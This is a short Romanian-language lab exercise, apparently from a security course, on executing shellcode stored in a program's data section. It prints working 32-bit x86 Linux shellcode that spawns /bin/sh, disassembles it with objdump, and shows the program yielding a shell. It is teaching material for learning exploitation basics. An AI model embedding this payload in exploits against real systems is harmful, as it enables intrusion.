# Shellcode Static

În anumite condiții, programele pot executa cod aflat în zona de date.

Examinați conținutul fișierului `shellcode-static.c` și folosiți comanda `make` pentru a compila fișierul.

Observați că programul execută instrucțiunile din variabila `shellcode`.

Pentru a examina instrucțiunile din variabila `shellcode`, folosiți:

``` shell
$ echo -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" > /tmp/test
$ objdump -D -M intel -b binary -m i386 /tmp/test


/tmp/test:     file format binary


Disassembly of section .data:

00000000 <.data>:
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   89 c1                   mov    ecx,eax
  11:   89 c2                   mov    edx,eax
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
  17:   31 c0                   xor    eax,eax
  19:   40                      inc    eax
  1a:   cd 80                   int    0x80
```

Nu executați niciodata cod fără să îl examinați în prealabil.

Lansați programul în execuție:

``` shell
$ ./shellcode-static 
$ whoami
kali
```

Observați cum codul din variabila `shellcode` va porni un shell de sistem.
